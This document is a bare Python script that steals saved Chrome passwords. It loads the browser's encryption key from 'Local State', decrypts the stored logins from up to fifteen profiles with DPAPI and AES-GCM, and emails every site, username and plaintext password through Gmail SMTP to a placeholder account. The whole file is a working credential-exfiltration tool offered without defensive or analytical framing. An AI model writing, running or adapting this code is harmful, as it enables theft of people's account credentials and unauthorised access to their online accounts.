import os
import sqlite3
import shutil
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from email.message import EmailMessage
import uuid
import ssl
import smtplib

arr = ["Default"]

for i in range(1, 15): 
    arr.append(f"Profile {i}")

LOCALSTATEPATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

def get_key():
    with open(LOCALSTATEPATH, 'r', encoding="utf-8") as file:
        localState = file.read()
        localState = json.loads(localState)
    key = base64.b64decode(localState["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decryp_password(password, key):
    iv = password[3:15]
    password = password[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(password)[:-16].decode()

def get_data(user):
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", user, "Login Data")
    if not os.path.exists(db_path):
        return ""
    login_data_copy = "login_data_temp.db"
    shutil.copyfile(db_path, login_data_copy)

    conn = sqlite3.connect(login_data_copy)
    cursor = conn.cursor()

    encrypted_chrome_data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()

    key = get_key()
    arr = []
    for row in encrypted_chrome_data:
        site, username, password = row
        try:
            password = decryp_password(password, key)
            if len(password) > 0 and len(username) > 0:
                arr.append((site, username, password))
        except Exception as e:
            print(f"Error decrypting password for site {site}: {e}")

    conn.close()
    os.remove(login_data_copy)
    return arr

def sendEmail(data):
    sender = "you@example.com"
    password = "YOUR 2FA CODE"
    receiver = "you@example.com"
    code = str(uuid.uuid4())
    half_len = len(code) // 2
    code = code[:half_len]

    subject = "Site, Username, Password"
    body = ""
    for i in data:
        body += str(i)

    em = EmailMessage()
    em['From'] = sender
    em['To'] = sender
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as smtp:
        smtp.login(sender,password)
        smtp.sendmail(sender,receiver,em.as_string())


if __name__ == "__main__":
    data = ""
    for i in arr:
        data += str(get_data(i))
    sendEmail(data)
